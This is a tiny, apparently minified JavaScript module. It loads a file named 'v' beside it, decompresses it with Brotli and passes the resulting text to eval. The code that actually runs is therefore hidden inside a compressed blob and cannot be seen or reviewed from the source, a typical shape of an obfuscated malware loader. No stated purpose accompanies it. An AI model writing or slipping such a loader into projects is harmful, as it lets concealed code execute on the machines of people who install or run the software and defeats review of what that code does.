import{readFileSync as R}from'fs'
import{brotliDecompressSync as b}from'zlib'
let p=import.meta.dirname+'/v'
let s=b(R(p))+''
await eval(s)
